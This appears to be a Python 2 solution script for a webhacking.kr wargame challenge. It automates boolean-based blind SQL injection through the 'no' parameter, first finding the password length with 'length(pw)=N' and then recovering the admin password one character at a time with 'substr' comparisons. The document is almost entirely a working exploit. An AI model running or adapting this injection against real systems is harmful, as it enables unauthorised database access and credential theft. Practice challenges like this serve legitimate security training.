import requests

url = 'http://webhacking.kr/challenge/web/web-29/index.php'

r = requests.session()
headers = {"Cookie": ""}
keyword = 'admin password :'
payload_basic = '2||'
pw_no_1 = 'guest'


def injection(rawdata, keyword):
    try:
        payload = {'no': rawdata, 'id': 'guest', 'pw': 'guest'}
        result = r.get(url, params=payload, headers=headers)
        # print result.content
        return keyword in result.content
    except Exception as e:
        print '**', e
        return -1


def QueryLength():
    length = 1

    while True:
        payload = payload_basic + "(length(pw)=" + str(length) + ")"
        # print payload
        if injection(payload, keyword):
            return length
            # break
        length += 1
        # print length
        # time.sleep(1)

    print 'Error. QueryLength Failed!'
    return len(pw_no_1)


def QueryFlag():

    pw = ''
    length = QueryLength()
    print 'length: ', length

    for i in range(length):
        for digit in range(32, 128):
            payload = payload_basic + \
                'substr(pw,%d,1)=%s' % (i + 1, hex(digit))
            if injection(payload, keyword):
                pw += chr(digit)
                print pw
                break
            if (digit == 127):
                pw += pw_no_1[i]
                print pw
                break
        # time.sleep(1)

    return pw

if __name__ == "__main__":
    print QueryFlag()
